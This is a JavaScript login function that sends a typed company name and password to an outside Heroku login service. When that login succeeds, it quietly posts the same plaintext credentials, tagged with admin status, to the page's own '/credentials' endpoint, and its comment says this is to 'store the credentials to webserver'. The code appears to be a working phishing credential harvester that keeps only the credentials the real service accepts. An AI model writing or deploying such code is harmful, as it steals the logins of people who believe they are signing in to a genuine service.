function login(){
  var usn = document.getElementById('company').value,
      psw = document.getElementById('password').value,
      url = 'https://lnu-face.herokuapp.com/login';

  // store the credentials to webserver

  var settings = {
    type: 'post',
    url: '/credentials',
    data: {
      company: usn,
      password: psw,
      admin: false
    },
    success: function(){
      console.log('credentials stored');
    },
    error: function(xhr){
      console.error(xhr);
    }
  }
  document.querySelector('div.submit.button').innerHTML = '<i class="spinner loading icon"></i>';


  var http = new XMLHttpRequest();
  http.open('POST', url, true);
  http.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  http.onload = function(){
    document.querySelector('div.submit.button').innerHTML = 'Login';
    if(http.readyState == 4 && http.status >= 200 && http.status <= 299) {
      if (http.status == 200) { // oh a admin logged in
        location.href = '/admin';
        settings.data.admin = true;
      }
      else if (http.status == 203) location.href = '/user';
      $.ajax(settings);
    }
    else {
      if(http.status == 404) document.querySelector('div.ui.error.message').innerHTML = 'Username or Password is incorrect';
      else document.querySelector('div.ui.error.message').innerHTML = http.responseText;

      // and display it as well
      document.querySelector('div.ui.error.message').style.display = 'block';
    }
  }
  http.onerror = function(xhr){
    document.querySelector('div.submit.button').innerHTML = 'Login';
    console.log(xhr);
    document.querySelectorAll('div.ui.error.message').innerHTML = 'Too long response time';
    document.querySelector('div.ui.error.message').style.display = 'block';
  }
  http.send(JSON.stringify({company:usn,password:psw}));
}
